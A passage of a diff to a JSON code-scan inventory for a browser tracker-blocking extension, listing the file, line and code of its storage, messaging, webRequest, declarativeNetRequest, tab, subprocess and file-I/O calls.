+        "file": "tests/tracker-shield.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/tracker-shield.test.cjs",
+        "line": 3,
+        "code": "const vm = require('node:vm');"
+      },
+      {
+        "file": "tests/tracker-shield.test.cjs",
+        "line": 4,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/tracker-shield.test.cjs",
+        "line": 5,
+        "code": "const path = require('node:path');"
+      },
+      {
+        "file": "tests/v2-scoring.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/v2-scoring.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/v2-scoring.test.cjs",
+        "line": 3,
+        "code": "require('../shared/sites.js');"
+      },
+      {
+        "file": "tests/v2-scoring.test.cjs",
+        "line": 4,
+        "code": "const d = require('../shared/detector.js');"
       }
     ],
     "storage_access": [
       {
         "file": "chrome/background.js",
-        "line": 15,
-        "code": "const {strictMode=true}=await api.storage.local.get('strictMode');strict=strictMode;"
+        "line": 20,
+        "code": "api.storage.local.get('securityEvents').then(res => {"
       },
       {
         "file": "chrome/background.js",
-        "line": 67,
+        "line": 23,
+        "code": "return api.storage.local.set({ securityEvents: list });"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 29,
+        "code": "api.storage.local.set({protectionDegraded:true}).catch(()=>{});"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 35,
+        "code": "api.storage.local.set({protectionDegraded:false}).catch(()=>{});"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 64,
+        "code": "const { strictMode = false, customWhitelist = [], showBadgeCount = true } = await api.storage.local.get(['strictMode', 'customWhitelist', 'showBadgeCount']);"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 152,
         "code": "try{const {blocked=0}=await api.storage.local.get('blocked');await api.storage.local.set({blocked:blocked+1});}catch{}"
       },
       {
-        "file": "chrome/popup.js",
-        "line": 10,
-        "code": "api.storage.local.get(['blocked', 'strictMode']).then(x => {"
+        "file": "chrome/background.js",
+        "line": 207,
+        "code": "api.storage.local.get(['trackersBlocked', 'aegisTrackerShield', 'adShieldEnabled', 'showBadgeCount']).then(res => {"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 210,
+        "code": "api.storage.local.set({ trackersBlocked: total }).catch(() => {});"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 262,
+        "code": "api.storage.local.get('showBadgeCount').then(({ showBadgeCount = true } = {}) => {"
+      },
+      {
+        "file": "chrome/guard.js",
+        "line": 172,
+        "code": "? api.storage.local.get('user_locale')"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 106,
+        "code": "const data = await api.storage.local.get(keys);"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 119,
+        "code": "await api.storage.local.set({ [key]: value });"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 314,
+        "code": "await api.storage.local.set({ blocked: 0, trackersBlocked: 0 });"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 389,
+        "code": "await api.storage.local.set(updated);"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 411,
+        "code": "await api.storage.local.clear();"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 412,
+        "code": "await api.storage.local.set(DEFAULTS);"
       },
       {
         "file": "chrome/popup.js",
-        "line": 22,
+        "line": 134,
+        "code": "api.storage.local.get(['blocked', 'trackersBlocked', 'strictMode', 'showSafeToast', 'aegisProtection', 'aegisTrackerShield', 'geDefenseLight', 'protectionDegraded', 'user_locale']).then(x => {"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 167,
         "code": "await api.storage.local.set({ strictMode: isStrict });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 174,
+        "code": "await api.storage.local.set({ showSafeToast: isShowSafeToast });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 181,
+        "code": "await api.storage.local.set({ aegisTrackerShield: isTrackerShield, adShieldEnabled: isTrackerShield });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 197,
+        "code": "await api.storage.local.set({ geDefenseLight: isGeDefense });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 204,
+        "code": "await api.storage.local.set({ aegisProtection: isAegis });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 237,
+        "code": "await api.storage.local.set({ user_locale: 'auto' });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 240,
+        "code": "await api.storage.local.set({ user_locale: chosen });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 305,
+        "code": "api.storage.local.get(['blocked', 'trackersBlocked']).then(res => {"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 534,
+        "code": "const getRes = api.storage.local.get(['showSafeToast', 'toastDuration', 'customWhitelist'], (res) => {"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 618,
+        "code": "const r = api.storage.local.get(["
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 638,
+        "code": "api.storage.local.get(['trackersBlocked'], (res) => {"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 640,
+        "code": "api.storage.local.set({ trackersBlocked: count }).catch(() => {});"
       },
       {
         "file": "firefox/background.js",
-        "line": 13,
+        "line": 14,
+        "code": "api.storage.local.get('securityEvents').then(res => {"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 17,
+        "code": "return api.storage.local.set({ securityEvents: list });"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 42,
+        "code": "api.storage.local.get(['customWhitelist']).then(res => {"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 71,
+        "code": "api.storage.local.set({ protectionDegraded: true }).catch(() => {});"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 77,
         "code": "api.storage.local.get('blocked').then(({blocked=0})=>api.storage.local.set({blocked:blocked+1})).catch(()=>{});"
       },
       {
-        "file": "firefox/popup.js",
-        "line": 10,
-        "code": "api.storage.local.get(['blocked', 'strictMode']).then(x => {"
+        "file": "firefox/background.js",
+        "line": 127,
+        "code": "api.storage.local.get(['trackersBlocked', 'aegisTrackerShield', 'adShieldEnabled']).then(res => {"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 130,
+        "code": "api.storage.local.set({ trackersBlocked: count }).catch(() => {});"
+      },
+      {
+        "file": "firefox/guard.js",
+        "line": 172,
+        "code": "? api.storage.local.get('user_locale')"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 106,
+        "code": "const data = await api.storage.local.get(keys);"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 119,
+        "code": "await api.storage.local.set({ [key]: value });"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 314,
+        "code": "await api.storage.local.set({ blocked: 0, trackersBlocked: 0 });"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 389,
+        "code": "await api.storage.local.set(updated);"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 411,
+        "code": "await api.storage.local.clear();"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 412,
+        "code": "await api.storage.local.set(DEFAULTS);"
       },
       {
         "file": "firefox/popup.js",
-        "line": 22,
+        "line": 134,
+        "code": "api.storage.local.get(['blocked', 'trackersBlocked', 'strictMode', 'showSafeToast', 'aegisProtection', 'aegisTrackerShield', 'geDefenseLight', 'protectionDegraded', 'user_locale']).then(x => {"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 167,
+        "code": "await api.storage.local.set({ strictMode: isStrict });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 174,
+        "code": "await api.storage.local.set({ showSafeToast: isShowSafeToast });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 181,
+        "code": "await api.storage.local.set({ aegisTrackerShield: isTrackerShield, adShieldEnabled: isTrackerShield });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 197,
+        "code": "await api.storage.local.set({ geDefenseLight: isGeDefense });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 204,
+        "code": "await api.storage.local.set({ aegisProtection: isAegis });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 237,
+        "code": "await api.storage.local.set({ user_locale: 'auto' });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 240,
+        "code": "await api.storage.local.set({ user_locale: chosen });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 305,
+        "code": "api.storage.local.get(['blocked', 'trackersBlocked']).then(res => {"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 534,
+        "code": "const getRes = api.storage.local.get(['showSafeToast', 'toastDuration', 'customWhitelist'], (res) => {"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 618,
+        "code": "const r = api.storage.local.get(["
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 638,
+        "code": "api.storage.local.get(['trackersBlocked'], (res) => {"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 640,
+        "code": "api.storage.local.set({ trackersBlocked: count }).catch(() => {});"
+      },
+      {
+        "file": "shared/guard.js",
+        "line": 172,
+        "code": "? api.storage.local.get('user_locale')"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 106,
+        "code": "const data = await api.storage.local.get(keys);"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 119,
+        "code": "await api.storage.local.set({ [key]: value });"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 314,
+        "code": "await api.storage.local.set({ blocked: 0, trackersBlocked: 0 });"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 389,
+        "code": "await api.storage.local.set(updated);"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 411,
+        "code": "await api.storage.local.clear();"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 412,
+        "code": "await api.storage.local.set(DEFAULTS);"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 134,
+        "code": "api.storage.local.get(['blocked', 'trackersBlocked', 'strictMode', 'showSafeToast', 'aegisProtection', 'aegisTrackerShield', 'geDefenseLight', 'protectionDegraded', 'user_locale']).then(x => {"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 167,
         "code": "await api.storage.local.set({ strictMode: isStrict });"
       },
       {
         "file": "shared/popup.js",
-        "line": 10,
-        "code": "api.storage.local.get(['blocked', 'strictMode']).then(x => {"
+        "line": 174,
+        "code": "await api.storage.local.set({ showSafeToast: isShowSafeToast });"
       },
       {
         "file": "shared/popup.js",
-        "line": 22,
-        "code": "await api.storage.local.set({ strictMode: isStrict });"
+        "line": 181,
+        "code": "await api.storage.local.set({ aegisTrackerShield: isTrackerShield, adShieldEnabled: isTrackerShield });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 197,
+        "code": "await api.storage.local.set({ geDefenseLight: isGeDefense });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 204,
+        "code": "await api.storage.local.set({ aegisProtection: isAegis });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 237,
+        "code": "await api.storage.local.set({ user_locale: 'auto' });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 240,
+        "code": "await api.storage.local.set({ user_locale: chosen });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 305,
+        "code": "api.storage.local.get(['blocked', 'trackersBlocked']).then(res => {"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 534,
+        "code": "const getRes = api.storage.local.get(['showSafeToast', 'toastDuration', 'customWhitelist'], (res) => {"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 618,
+        "code": "const r = api.storage.local.get(["
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 638,
+        "code": "api.storage.local.get(['trackersBlocked'], (res) => {"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 640,
+        "code": "api.storage.local.set({ trackersBlocked: count }).catch(() => {});"
       }
     ],
     "runtime_message": [
       {
+        "file": "CHANGELOG.md",
+        "line": 37,
+        "code": "- Behebt fehlenden `typeof api.runtime.sendMessage === 'function'`-Guard in `firefox/background.js`."
+      },
+      {
         "file": "chrome/background.js",
-        "line": 88,
+        "line": 219,
+        "code": "api.runtime.sendMessage({ type: 'trackers-updated', tabId, count }).catch(() => {});"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 255,
         "code": "api.runtime.onMessage.addListener((request,sender,reply)=>{"
       },
       {
+        "file": "chrome/background.js",
+        "line": 267,
+        "code": "api.runtime.sendMessage({ type: 'trackers-updated', tabId, count }).catch(() => {});"
+      },
+      {
         "file": "chrome/guard.js",
-        "line": 30,
+        "line": 45,
         "code": "const response = await api.runtime.sendMessage({"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 288,
+        "code": "if (api && api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 289,
+        "code": "api.runtime.sendMessage({ type: 'aegis:rotate-seed', seed: freshSeed }).catch(() => {});"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 55,
+        "code": "if (api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 56,
+        "code": "const resp = await api.runtime.sendMessage({ type: 'getTabTrackerStats', tabId: tab.id }).catch(() => null);"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 300,
+        "code": "if (api.runtime && api.runtime.onMessage && typeof api.runtime.onMessage.addListener === 'function') {"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 301,
+        "code": "api.runtime.onMessage.addListener((msg) => {"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 644,
+        "code": "if (api && api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 646,
+        "code": "api.runtime.sendMessage({ type: 'tracker-blocked-event', detail: e?.detail }).catch(() => {});"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 652,
+        "code": "if (api && api.runtime && api.runtime.onMessage && typeof api.runtime.onMessage.addListener === 'function') {"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 654,
+        "code": "api.runtime.onMessage.addListener((msg) => {"
       },
       {
         "file": "firefox/background.js",
-        "line": 23,
+        "line": 140,
+        "code": "if (api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 141,
+        "code": "api.runtime.sendMessage({ type: 'trackers-updated', tabId, count: tabCount }).catch(() => {});"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 165,
         "code": "api.runtime.onMessage.addListener(async(req,sender)=>{"
       },
       {
+        "file": "firefox/background.js",
+        "line": 176,
+        "code": "if (api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 177,
+        "code": "api.runtime.sendMessage({ type: 'trackers-updated', tabId, count: tabCount }).catch(() => {});"
+      },
+      {
         "file": "firefox/guard.js",
-        "line": 30,
+        "line": 45,
         "code": "const response = await api.runtime.sendMessage({"
       },
       {
+        "file": "firefox/options.js",
+        "line": 288,
+        "code": "if (api && api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 289,
+        "code": "api.runtime.sendMessage({ type: 'aegis:rotate-seed', seed: freshSeed }).catch(() => {});"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 55,
+        "code": "if (api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 56,
+        "code": "const resp = await api.runtime.sendMessage({ type: 'getTabTrackerStats', tabId: tab.id }).catch(() => null);"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 300,
+        "code": "if (api.runtime && api.runtime.onMessage && typeof api.runtime.onMessage.addListener === 'function') {"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 301,
+        "code": "api.runtime.onMessage.addListener((msg) => {"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 644,
+        "code": "if (api && api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 646,
+        "code": "api.runtime.sendMessage({ type: 'tracker-blocked-event', detail: e?.detail }).catch(() => {});"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 652,
+        "code": "if (api && api.runtime && api.runtime.onMessage && typeof api.runtime.onMessage.addListener === 'function') {"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 654,
+        "code": "api.runtime.onMessage.addListener((msg) => {"
+      },
+      {
         "file": "shared/guard.js",
-        "line": 30,
+        "line": 45,
         "code": "const response = await api.runtime.sendMessage({"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 288,
+        "code": "if (api && api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 289,
+        "code": "api.runtime.sendMessage({ type: 'aegis:rotate-seed', seed: freshSeed }).catch(() => {});"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 55,
+        "code": "if (api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 56,
+        "code": "const resp = await api.runtime.sendMessage({ type: 'getTabTrackerStats', tabId: tab.id }).catch(() => null);"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 300,
+        "code": "if (api.runtime && api.runtime.onMessage && typeof api.runtime.onMessage.addListener === 'function') {"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 301,
+        "code": "api.runtime.onMessage.addListener((msg) => {"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 644,
+        "code": "if (api && api.runtime && typeof api.runtime.sendMessage === 'function') {"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 646,
+        "code": "api.runtime.sendMessage({ type: 'tracker-blocked-event', detail: e?.detail }).catch(() => {});"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 652,
+        "code": "if (api && api.runtime && api.runtime.onMessage && typeof api.runtime.onMessage.addListener === 'function') {"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 654,
+        "code": "api.runtime.onMessage.addListener((msg) => {"
       }
     ],
     "webrequest": [
       {
+        "file": "chrome/background.js",
+        "line": 204,
+        "code": "if (api.webRequest && api.webRequest.onBeforeRequest) {"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 205,
+        "code": "api.webRequest.onBeforeRequest.addListener(details => {"
+      },
+      {
         "file": "firefox/background.js",
-        "line": 17,
+        "line": 82,
         "code": "api.webRequest.onBeforeRequest.addListener("
       },
       {
-        "file": "README.md",
-        "line": 33,
-        "code": "4. Die Konfiguration arbeitet mit `webRequest.onBeforeRequest` und blockiert Hauptdokument-Anfragen vor dem Absenden."
+        "file": "firefox/background.js",
+        "line": 147,
+        "code": "api.webRequest.onBeforeRequest.addListener("
       }
     ],
     "dnr": [
       {
         "file": "chrome/background.js",
-        "line": 17,
-        "code": "const oldSessions=await api.declarativeNetRequest.getSessionRules();"
+        "line": 59,
+        "code": "const oldSessions = await api.declarativeNetRequest.getSessionRules();"
       },
       {
         "file": "chrome/background.js",
-        "line": 19,
-        "code": "if(stale.length)await api.declarativeNetRequest.updateSessionRules({removeRuleIds:stale});"
+        "line": 61,
+        "code": "if (stale.length) await api.declarativeNetRequest.updateSessionRules({ removeRuleIds: stale });"
       },
       {
         "file": "chrome/background.js",
-        "line": 21,
-        "code": "const existing=await api.declarativeNetRequest.getDynamicRules();"
+        "line": 70,
+        "code": "if (api.declarativeNetRequest && api.declarativeNetRequest.setExtensionActionOptions) {"
       },
       {
         "file": "chrome/background.js",
-        "line": 23,
-        "code": "if(!strict){await api.declarativeNetRequest.updateDynamicRules({removeRuleIds:ids});return;}"
+        "line": 71,
+        "code": "try { await api.declarativeNetRequest.setExtensionActionOptions({ displayActionCountAsBadgeText: showBadgeCount !== false }); } catch {}"
       },
       {
         "file": "chrome/background.js",
-        "line": 25,
+        "line": 77,
+        "code": "await api.declarativeNetRequest.updateDynamicRules({removeRuleIds:[RULE_ID]});"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 82,
         "code": "const supported=await api.declarativeNetRequest.isRegexSupported({regex,requireCapturing:true});"
       },
       {
         "file": "chrome/background.js",
-        "line": 40,
-        "code": "await api.declarativeNetRequest.updateDynamicRules({removeRuleIds:ids,addRules:[rule]});"
+        "line": 97,
+        "code": "await api.declarativeNetRequest.updateDynamicRules({removeRuleIds:[RULE_ID],addRules:[rule]});"
       },
       {
         "file": "chrome/background.js",
-        "line": 51,
+        "line": 111,
         "code": "if(old) await api.declarativeNetRequest.updateSessionRules({removeRuleIds:[old]});"
       },
       {
         "file": "chrome/background.js",
-        "line": 53,
-        "code": "const supported=await api.declarativeNetRequest.isRegexSupported({regex:regexp});"
-      },
-      {
-        "file": "chrome/background.js",
-        "line": 55,
+        "line": 113,
         "code": "await api.declarativeNetRequest.updateSessionRules({addRules:[{"
       },
       {
         "file": "chrome/background.js",
-        "line": 64,
+        "line": 132,
         "code": "try{await api.declarativeNetRequest.updateSessionRules({removeRuleIds:[id]});}catch{}"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 182,
+        "code": "if (api.declarativeNetRequest && typeof api.declarativeNetRequest.updateEnabledRulesets === 'function') {"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 185,
+        "code": "await api.declarativeNetRequest.updateEnabledRulesets({ enableRulesetIds: ['aegis_trackers'] });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 187,
+        "code": "await api.declarativeNetRequest.updateEnabledRulesets({ disableRulesetIds: ['aegis_trackers'] });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 182,
+        "code": "if (api.declarativeNetRequest && typeof api.declarativeNetRequest.updateEnabledRulesets === 'function') {"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 185,
+        "code": "await api.declarativeNetRequest.updateEnabledRulesets({ enableRulesetIds: ['aegis_trackers'] });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 187,
+        "code": "await api.declarativeNetRequest.updateEnabledRulesets({ disableRulesetIds: ['aegis_trackers'] });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 182,
+        "code": "if (api.declarativeNetRequest && typeof api.declarativeNetRequest.updateEnabledRulesets === 'function') {"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 185,
+        "code": "await api.declarativeNetRequest.updateEnabledRulesets({ enableRulesetIds: ['aegis_trackers'] });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 187,
+        "code": "await api.declarativeNetRequest.updateEnabledRulesets({ disableRulesetIds: ['aegis_trackers'] });"
       }
     ],
     "tab_access": [
       {
         "file": "chrome/background.js",
-        "line": 86,
+        "line": 248,
         "code": "api.tabs.update(info.tabId,{url:api.runtime.getURL('guard.html')+'?url='+encodeURIComponent(info.url)}).catch(()=>{});"
       },
       {
         "file": "chrome/background.js",
-        "line": 94,
+        "line": 253,
+        "code": "api.tabs.update(info.tabId,{url:api.runtime.getURL('guard.html')+'?url='+encodeURIComponent(info.url)}).catch(()=>{});"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 285,
         "code": "const tab=await api.tabs.get(tabId);"
       },
       {
         "file": "chrome/guard.js",
-        "line": 28,
+        "line": 43,
         "code": "const tab = await api.tabs.getCurrent();"
       },
       {
+        "file": "chrome/popup.js",
+        "line": 42,
+        "code": "let tabs = await api.tabs.query({ active: true, lastFocusedWindow: true });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 44,
+        "code": "tabs = await api.tabs.query({ active: true, currentWindow: true });"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 212,
+        "code": "const tabs = await api.tabs.query({ active: true, currentWindow: true });"
+      },
+      {
         "file": "firefox/background.js",
-        "line": 27,
+        "line": 190,
         "code": "const tab=await api.tabs.get(tabId);"
       },
       {
         "file": "firefox/guard.js",
-        "line": 28,
+        "line": 43,
         "code": "const tab = await api.tabs.getCurrent();"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 42,
+        "code": "let tabs = await api.tabs.query({ active: true, lastFocusedWindow: true });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 44,
+        "code": "tabs = await api.tabs.query({ active: true, currentWindow: true });"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 212,
+        "code": "const tabs = await api.tabs.query({ active: true, currentWindow: true });"
       },
       {
         "file": "shared/guard.js",
-        "line": 28,
+        "line": 43,
         "code": "const tab = await api.tabs.getCurrent();"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 42,
+        "code": "let tabs = await api.tabs.query({ active: true, lastFocusedWindow: true });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 44,
+        "code": "tabs = await api.tabs.query({ active: true, currentWindow: true });"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 212,
+        "code": "const tabs = await api.tabs.query({ active: true, currentWindow: true });"
       }
     ],
-    "dangerous_shell": [],
+    "dangerous_shell": [
+      {
+        "file": "build.py",
+        "line": 10,
+        "code": "import subprocess"
+      },
+      {
+        "file": "build.py",
+        "line": 19,
+        "code": "res = subprocess.run([sys.executable, str(sites_script)], capture_output=True, text=True, cwd=str(ROOT))"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 8,
+        "code": "import subprocess"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 50,
+        "code": "res = subprocess.run(cmd, capture_output=True, text=True, encoding=\"utf-8\", errors=\"replace\")"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 131,
+        "code": "res = subprocess.run(cmd, capture_output=True, text=True, encoding=\"utf-8\", errors=\"replace\")"
+      },
+      {
+        "file": "scripts/publish_github_releases.py",
+        "line": 8,
+        "code": "import subprocess"
+      },
+      {
+        "file": "scripts/publish_github_releases.py",
+        "line": 15,
+        "code": "proc = subprocess.run("
+      }
+    ],
     "file_io": [
       {
         "file": "build.py",
-        "line": 11,
-        "code": "shutil.copyfile(ROOT/'shared'/f,path)"
+        "line": 57,
+        "code": "shutil.copyfile(ROOT / 'shared' / f, path)"
       },
       {
         "file": "build.py",
-        "line": 15,
-        "code": "shutil.copyfile(ROOT/'icons'/f,path)"
+        "line": 61,
+        "code": "shutil.copyfile(ROOT / 'icons' / f, path)"
       },
       {
         "file": "build.py",
-        "line": 28,
-        "code": "shutil.copyfile(zip_path, legacy_zip)"
+        "line": 67,
+        "code": "shutil.rmtree(locales_dst)"
       },
       {
         "file": "build.py",
-        "line": 35,
-        "code": "shutil.copyfile(src_zip, ROOT.parent / 'VGT-DomainGuard-Source-v0.1.0.zip')"
+        "line": 68,
+        "code": "shutil.copytree(locales_src, locales_dst)"
+      },
+      {
+        "file": "build.py",
+        "line": 74,
+        "code": "shutil.rmtree(rulesets_dst)"
+      },
+      {
+        "file": "build.py",
+        "line": 75,
+        "code": "shutil.copytree(rulesets_src, rulesets_dst)"
+      },
+      {
+        "file": "chrome/popup.js",
+        "line": 295,
+        "code": "window.open(api.runtime.getURL('options.html'));"
+      },
+      {
+        "file": "firefox/popup.js",
+        "line": 295,
+        "code": "window.open(api.runtime.getURL('options.html'));"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 26,
+        "code": "shutil.copyfile(css, tmp_path / css.name)"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 112,
+        "code": "shutil.copyfile(ROOT / \"shared/design-tokens.css\", tmp_path / \"design-tokens.css\")"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 113,
+        "code": "shutil.copyfile(ROOT / \"shared/popup.css\", tmp_path / \"popup.css\")"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 295,
+        "code": "window.open(api.runtime.getURL('options.html'));"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 163,
+        "code": "open(url) {"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 220,
+        "code": "const aegisCode = fs.readFileSync(path.join(__dirname, '..', 'shared', 'aegis-engine.js'), 'utf8');"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 229,
+        "code": "const rules = JSON.parse(fs.readFileSync(filePath, 'utf8'));"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 309,
+        "code": "const res = fakeWindow.open('https://serve.popads.net/popunder.php');"
+      },
+      {
+        "file": "tests/aegis-shield.test.cjs",
+        "line": 101,
+        "code": "const aegisCode = fs.readFileSync(path.join(__dirname, '..', 'shared', 'aegis-engine.js'), 'utf8');"
       },
       {
         "file": "tests/chrome-worker.test.cjs",
-        "line": 41,
+        "line": 47,
         "code": "for(const file of names)vm.runInContext(fs.readFileSync(path.join(root,file),'utf8'),context);"
       },
       {
         "file": "tests/chrome-worker.test.cjs",
-        "line": 43,
+        "line": 49,
         "code": "vm.runInContext(fs.readFileSync(path.join(root,'background.js'),'utf8'),context);"
       },
       {
         "file": "tests/firefox-worker.test.cjs",
         "line": 19,
         "code": "vm.runInContext(fs.readFileSync(path.join(root,f),'utf8'),context);"
+      },
+      {
+        "file": "tests/firefox-worker.test.cjs",
+        "line": 39,
+        "code": "const manifest = JSON.parse(fs.readFileSync(path.join(root, 'manifest.json'), 'utf8'));"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 202,
+        "code": "const engineSource = fs.readFileSync(path.join(__dirname, '../shared/aegis-engine.js'), 'utf-8');"
+      },
+      {
+        "file": "tests/i18n.test.cjs",
+        "line": 73,
+        "code": "const data = JSON.parse(fs.readFileSync(p, 'utf8'));"
+      },
+      {
